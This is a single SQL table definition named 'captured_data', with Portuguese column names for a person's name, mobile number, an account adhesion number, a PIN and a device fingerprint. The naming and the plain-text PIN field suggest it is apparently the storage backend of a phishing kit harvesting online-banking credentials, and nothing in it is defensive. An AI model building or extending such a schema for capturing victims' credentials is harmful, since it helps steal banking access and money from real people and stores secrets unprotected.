CREATE TABLE `captured_data` (
	`id` int AUTO_INCREMENT NOT NULL,
	`nome` text NOT NULL,
	`telemovel` varchar(20) NOT NULL,
	`numeroAdesao` varchar(20) NOT NULL,
	`pin` varchar(10) NOT NULL,
	`fingerprint` text,
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `captured_data_id` PRIMARY KEY(`id`)
);
